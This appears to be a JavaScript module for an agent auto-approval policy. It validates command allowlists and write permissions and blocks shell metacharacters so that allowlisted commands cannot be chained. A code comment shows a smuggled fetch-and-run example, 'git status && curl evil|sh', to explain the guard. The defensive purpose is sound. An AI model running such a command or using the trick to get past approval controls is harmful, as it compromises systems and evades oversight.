export function defaultPolicy() {
  return {
    enabled: false,
    autoApproveWrites: 'off',
    commandAllowlist: [],
    autoAcceptReviews: false,
    maxAutoApprovalsPerHour: 20
  };
}

const WRITE_MODES = ['off', 'verified-agents', 'all-agents'];

export function validatePolicy(input = {}) {
  const policy = defaultPolicy();
  policy.enabled = Boolean(input.enabled);
  policy.autoAcceptReviews = Boolean(input.autoAcceptReviews);
  if (input.autoApproveWrites !== undefined) {
    if (!WRITE_MODES.includes(input.autoApproveWrites)) throw new Error('autoApproveWrites must be off, verified-agents, or all-agents');
    policy.autoApproveWrites = input.autoApproveWrites;
  }
  if (input.maxAutoApprovalsPerHour !== undefined) {
    const cap = Number(input.maxAutoApprovalsPerHour);
    if (!Number.isInteger(cap) || cap < 1 || cap > 500) throw new Error('maxAutoApprovalsPerHour must be an integer between 1 and 500');
    policy.maxAutoApprovalsPerHour = cap;
  }
  if (input.commandAllowlist !== undefined) {
    if (!Array.isArray(input.commandAllowlist)) throw new Error('commandAllowlist must be an array of patterns');
    if (input.commandAllowlist.length > 50) throw new Error('commandAllowlist supports at most 50 patterns');
    const patterns = [];
    for (const entry of input.commandAllowlist) {
      if (typeof entry !== 'string') throw new Error('commandAllowlist entries must be strings');
      const pattern = entry.trim();
      if (!pattern) continue;
      if (pattern.length > 400) throw new Error('Allowlist patterns must be 400 characters or fewer');
      if (!/[^*\s]/.test(pattern)) throw new Error('Allowlist patterns must contain more than wildcards');
      if (!patterns.includes(pattern)) patterns.push(pattern);
    }
    policy.commandAllowlist = patterns;
  }
  return policy;
}

export function globMatch(pattern, value) {
  const parts = pattern.split('*');
  if (parts.length === 1) return pattern === value;
  const last = parts.at(-1);
  if (!value.startsWith(parts[0]) || !value.endsWith(last)) return false;
  let index = parts[0].length;
  for (const part of parts.slice(1, -1)) {
    if (!part) continue;
    const found = value.indexOf(part, index);
    if (found === -1 || found + part.length > value.length - last.length) return false;
    index = found + part.length;
  }
  return index <= value.length - last.length;
}

// Auto-approved commands are executed through /bin/sh -lc, so a wildcard like
// "git status*" must not be allowed to expand across shell operators into a
// second command (e.g. "git status && curl evil|sh").
const SHELL_METACHARACTERS = /[&|;<>`$()\n\r]/;

export function hasShellMetacharacters(command) {
  return SHELL_METACHARACTERS.test(String(command ?? ''));
}

export function commandAllowed(policy, command) {
  if (hasShellMetacharacters(command)) return null;
  return policy.commandAllowlist.find((pattern) => globMatch(pattern, command)) ?? null;
}

export function autoApprovalsInWindow(state, nowMs = Date.now()) {
  return state.approvals.filter((entry) => entry.decidedBy === 'autopilot' && entry.status === 'auto-approved'
    && Date.parse(entry.decidedAt) > nowMs - 3_600_000).length;
}

export function evaluateAutoApproval(state, approval, { running }) {
  const policy = state.policy;
  if (!policy?.enabled) return { allow: false };
  if (state.room.paused) return { allow: false };
  if (running >= state.room.limits.maxConcurrentRuns) return { allow: false };
  if (autoApprovalsInWindow(state) >= policy.maxAutoApprovalsPerHour) return { allow: false, code: 'rate-capped' };
  if (approval.type === 'agent-write') {
    if (policy.autoApproveWrites === 'all-agents') return { allow: true, reason: 'policy auto-approves write access for all agents' };
    if (policy.autoApproveWrites === 'verified-agents') {
      const agent = state.agents.find((entry) => entry.id === approval.agentId);
      if (agent?.status === 'installed' && agent.connection === 'verified')
        return { allow: true, reason: `policy auto-approves write access for verified agents (${agent.name} is verified)` };
    }
    return { allow: false };
  }
  if (approval.type === 'command') {
    const pattern = commandAllowed(policy, approval.command);
    if (pattern) return { allow: true, reason: `command matched allowlist pattern “${pattern}”` };
  }
  return { allow: false };
}
